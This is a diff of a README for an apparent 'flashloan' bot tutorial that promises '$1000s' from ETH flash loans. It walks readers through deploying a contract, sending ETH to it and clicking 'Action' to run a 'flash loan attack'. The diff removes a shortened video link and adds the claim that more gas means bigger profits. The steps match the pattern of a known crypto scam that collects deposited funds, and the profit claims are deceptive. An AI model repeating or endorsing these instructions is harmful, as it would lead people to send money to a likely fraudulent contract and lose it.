@@ -1,8 +1,6 @@
 # flashloan
 Learn How To Make $1000s Using ETH Flash Loans
 
-Video Tutorial: https://rb.gy/1awngi
-
 Text Tutorial:
 
 1. Get MetaMask: https://metamask.io/download.html
@@ -19,6 +17,6 @@ Text Tutorial:
 
 7. Move to the 'Deploy' tab again, select a Tokenname, Tokensymbol and Loan amount of 500 and then 'Deploy'. After the transaction is confirmed, it’s your bot.
 
-8. To give your bot gas so that it can run, copy the bots contract address from 'Deployed Contracts', open MetaMask, select 'Send', then paste your bots contract address and send at least 0.05 ETH to cover gas.
+8. To give your bot gas so that it can run, copy the bots contract address from 'Deployed Contracts', open MetaMask, select 'Send', then paste your bots contract address and send at least 0.05 ETH to cover gas. (More gas means bigger profits)
 
 9. After your transaction was confirmed, start the bot by clicking the 'Action' button. Now wait for the flash loan attack confirmation. Afterwards your bot automatically withdraws the remaining funds and profits back to the connected Metamask wallet.
